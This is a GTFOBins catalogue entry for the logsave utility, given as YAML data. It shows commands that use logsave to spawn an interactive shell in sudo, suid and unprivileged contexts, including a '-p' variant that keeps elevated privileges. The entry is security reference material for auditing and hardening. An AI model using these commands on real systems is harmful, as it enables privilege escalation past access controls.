<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/logsave -->
---
functions:
  shell:
  - code: |-
      logsave /dev/null /bin/sh -i
    contexts:
      sudo:
      suid:
        code: |-
          logsave /dev/null /bin/sh -i -p
        shell: false
      unprivileged:
...
